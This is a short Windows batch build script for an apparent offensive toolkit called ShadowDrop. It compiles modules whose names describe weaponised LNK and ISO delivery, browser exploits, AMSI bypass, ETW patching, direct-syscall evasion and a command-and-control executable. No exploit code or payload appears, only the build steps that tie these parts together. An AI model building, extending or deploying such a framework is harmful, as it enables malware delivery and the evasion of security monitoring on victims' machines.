@echo off
setlocal

:: build core components
cd Core
call build.bat
cd ..

:: build vectors
cl /O2 /GL /MT /EHsc /Fe:Vectors.dll /LD Vectors\LNK_Generator\LnkWeaponizer.cpp Vectors\ISO_Weaponizer\IsoExploitPack.cpp Vectors\OneClick_Exploits\BrowserExploit.cpp

:: build evasion modules
cl /O2 /GL /MT /EHsc /Fe:Evasion.dll /LD Evasion\AMSI_Killer\AmsiBypass.cpp Evasion\ETW_Eraser\EtwPatch.cpp Evasion\Syscall_Hell\SyscallDispatcher.cpp

:: build C2 and Ops
cl /O2 /GL /MT /EHsc /Fe:ShadowDrop.exe ShadowDrop.cpp Core\ShadowDropCore.lib

echo Build complete!
